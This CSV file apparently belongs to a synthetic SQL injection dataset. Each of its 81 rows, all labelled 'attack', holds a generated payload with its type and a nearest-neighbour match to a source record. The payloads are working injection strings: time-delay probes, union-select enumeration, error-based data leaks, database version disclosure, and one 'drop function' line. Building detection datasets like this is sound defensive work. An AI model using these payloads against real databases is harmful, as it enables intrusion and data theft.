id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.651508249976083
CTGAN_000002,attack,other, (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R001248,3.6120491725397277
CTGAN_000003,attack,time,1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',nearest_attack_euclidean,R004731,4.60582889668301
CTGAN_000004,attack,boolean,"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006303,3.8188556560145077
CTGAN_000005,attack,union,"-2605%'   )    )     )   union all select 4738,4738#",nearest_attack_euclidean,R004305,4.459641578292363
CTGAN_000006,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.980323101185343
CTGAN_000007,attack,error,-5313'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'wkkp' like 'wkkp,nearest_attack_euclidean,R005602,5.576816471881631
CTGAN_000008,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R003872,3.5926874327728564
CTGAN_000009,attack,other, union   (  select @@version  )   --,nearest_attack_euclidean,R000431,10.331635608404046
CTGAN_000010,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.484098691459028
CTGAN_000011,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,2.333220686824878
CTGAN_000012,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,39.8453574522543
CTGAN_000013,attack,union,"1'  )   union all select null,null,null,null#",nearest_attack_euclidean,R004140,2.4857096811898227
CTGAN_000014,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R008823,3.514580493797127
CTGAN_000015,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R008355,4.561356322203002
CTGAN_000016,attack,boolean,"1'  )   and make_set  (  7187  =  4625,4625  )   and   (  'diai' like 'diai",nearest_attack_euclidean,R006984,2.8483530088536284
CTGAN_000017,attack,other,"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R008477,5.537198449524326
CTGAN_000018,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R007392,2.8614021719357465
CTGAN_000019,attack,other,1'   )    )    as eymg where 7000  =  7000,nearest_attack_euclidean,R000829,3.3435615927158002
CTGAN_000020,attack,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",nearest_attack_euclidean,R001942,7.031709026207193
CTGAN_000021,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R006250,3.76772027671837
CTGAN_000022,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",nearest_attack_euclidean,R006290,1.9573331642632286
CTGAN_000023,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R005048,4.094720148049012
CTGAN_000024,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R003160,3.256045773155805
CTGAN_000025,attack,error,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",nearest_attack_euclidean,R006154,5.496045159767379
CTGAN_000026,attack,time,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R003344,4.854281270549364
CTGAN_000027,attack,other, (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,nearest_attack_euclidean,R004608,3.596806709059929
CTGAN_000028,attack,boolean,"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R006345,3.3210647197643257
CTGAN_000029,attack,error,"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R003346,2.9800976294297805
CTGAN_000030,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R002270,3.248658758269838
CTGAN_000031,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R004944,4.9928520408293675
CTGAN_000032,attack,union,"-9566%""  )   union all select 7973,7973,7973,7973--",nearest_attack_euclidean,R002875,6.619554316458273
CTGAN_000033,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,2.8930210577255324
CTGAN_000034,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R002638,3.495760206417487
CTGAN_000035,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R006281,5.546878957843666
CTGAN_000036,attack,other,1  )   as nmlm where 9872  =  9872,nearest_attack_euclidean,R005215,1.0952074270469017
CTGAN_000037,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.11524292284192
CTGAN_000038,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,2.4242495813250886
CTGAN_000039,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R002133,4.634838463335445
CTGAN_000040,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,4.654689756505812
CTGAN_000041,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R008996,2.116618771399555
CTGAN_000042,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R007987,3.5416863339718616
CTGAN_000043,attack,union,"1""  )   union all select null,null,null,null#",nearest_attack_euclidean,R001763,2.6943314086648713
CTGAN_000044,attack,other,"1""   )    )    as ikuz where 7385  =  7385",nearest_attack_euclidean,R007448,1.2169631043248177
CTGAN_000045,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,1.5183311996580777
CTGAN_000046,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000455,5.365490467334805
CTGAN_000047,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R002680,3.947102770515899
CTGAN_000048,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R006278,3.7514240357868482
CTGAN_000049,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000182,6.02269559942068
CTGAN_000050,attack,time,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R001645,3.3049360925456077
CTGAN_000051,attack,boolean,1%' rlike   (  select   (  case when   (  3596  =  4245  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R004426,3.5106995191845662
CTGAN_000052,attack,boolean,"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006511,2.372813641957536
CTGAN_000053,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R008306,3.307675847009491
CTGAN_000054,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R003450,3.226247505485433
CTGAN_000055,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,2.0880612776547274
CTGAN_000056,attack,boolean,"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""kzcd""  =  ""kzcd",nearest_attack_euclidean,R008021,4.0251175927321245
CTGAN_000057,attack,boolean,-3186 or 3867  =  9405,nearest_attack_euclidean,R003609,1.670740015801687
CTGAN_000058,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.501016143669792
CTGAN_000059,attack,error,1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,nearest_attack_euclidean,R005964,4.574806122818534
CTGAN_000060,attack,boolean,"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,nearest_attack_euclidean,R004489,3.9652752762887085
CTGAN_000061,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R006675,3.3614029733065225
CTGAN_000062,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,19.478125412189094
CTGAN_000063,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,2.247748425873727
CTGAN_000064,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R003189,3.5214912884324296
CTGAN_000065,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",nearest_attack_euclidean,R006341,4.270370929843632
CTGAN_000066,attack,union,"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R002501,4.739139441269635
CTGAN_000067,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R003519,2.8325837427864857
CTGAN_000068,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R008206,2.5167811743878694
CTGAN_000069,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R004834,2.415779875488046
CTGAN_000070,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R008155,3.7697317734054274
CTGAN_000071,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R005222,5.006770317371732
CTGAN_000072,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,1.9309890158941498
CTGAN_000073,attack,other,1   )    )    as muyz where 6105  =  6105,nearest_attack_euclidean,R000889,0.8514588047150241
CTGAN_000074,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R006986,7.893479679072387
CTGAN_000075,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R001026,3.3678108241959324
CTGAN_000076,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,4.655607948587206
CTGAN_000077,attack,error,"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R006590,4.907555273885999
CTGAN_000078,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R001955,4.871081241590491
CTGAN_000079,attack,boolean,"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001144,3.774555327746676
CTGAN_000080,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003179,2.8676140332573268
CTGAN_000081,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.123426452109783
